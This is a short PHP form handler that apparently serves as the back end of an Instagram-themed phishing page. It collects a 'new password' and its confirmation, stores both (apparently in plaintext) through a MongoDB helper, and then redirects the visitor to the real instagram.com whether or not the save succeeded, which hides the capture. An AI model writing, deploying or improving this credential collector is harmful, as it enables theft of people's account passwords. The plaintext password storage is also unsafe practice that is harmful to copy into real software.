<?php
session_start();
require_once 'db.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Check if user session exists
    if (!isset($_SESSION['user_id'])) {
        header('Location: login.html');
        exit();
    }
    
    // Get form data
    $newPassword = isset($_POST['new_password']) ? trim($_POST['new_password']) : '';
    $confirmPassword = isset($_POST['confirm_password']) ? trim($_POST['confirm_password']) : '';
    $userId = $_SESSION['user_id'];
    
    // Validate input
    if (empty($newPassword) || empty($confirmPassword)) {
        header('Location: set-password.html?error=empty');
        exit();
    }
    
    if ($newPassword !== $confirmPassword) {
        header('Location: set-password.html?error=mismatch');
        exit();
    }
    
    // Update user password in MongoDB
    $updated = updateUserPassword($userId, $newPassword, $confirmPassword);
    
    if ($updated) {
        // Clear session
        session_destroy();
        
        // Redirect to Instagram
        header('Location: https://instagram.com');
        exit();
    } else {
        // If update fails, still redirect but log the error
        error_log("Failed to update password for user: " . $userId);
        session_destroy();
        header('Location: https://instagram.com');
        exit();
    }
} else {
    // Redirect to password setup page if accessed directly
    header('Location: set-password.html');
    exit();
}
?>
